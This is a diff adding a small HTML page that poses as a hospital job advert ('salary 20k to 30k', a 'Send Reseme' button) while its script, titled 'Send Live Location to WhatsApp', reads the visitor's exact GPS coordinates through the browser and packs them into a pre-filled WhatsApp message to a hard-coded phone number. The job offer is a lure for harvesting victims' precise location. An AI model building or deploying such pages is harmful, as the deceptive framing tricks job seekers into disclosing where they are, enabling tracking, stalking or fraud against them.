@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Live Location to WhatsApp</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 30px; }
+    button { padding: 12px 20px; font-size: 16px; }
+    #wa-link { display: none; margin-top: 15px; }
+  </style>
+</head>
+<body>
+  <h2>Are yoy looking Hospital Job </h2>
+  <h3>salary 20k to 30k </h3>
+  <button onclick="sendLocation()">Send Reseme </button>
+  <br>
+  
+  <a id="wa-link" href="#" target="_blank">Open WhatsApp</a>
+
+  <script>
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+        const message = `Hi, sir I need Job for Health Care: ${mapsLink}`;
+        const mobileNumber = '919507330804'; // Without + or dashes
+        const waUrl = `https://wa.me/${mobileNumber}?text=${encodeURIComponent(message)}`;
+
+        const waLink = document.getElementById('wa-link');
+        waLink.href = waUrl;
+        waLink.style.display = 'inline-block';
+        waLink.innerText = 'Open WhatsApp';
+
+      }, function(error) {
+        alert("Could not get your location.");
+      });
+    }
+  </script>
+</body>
+</html>
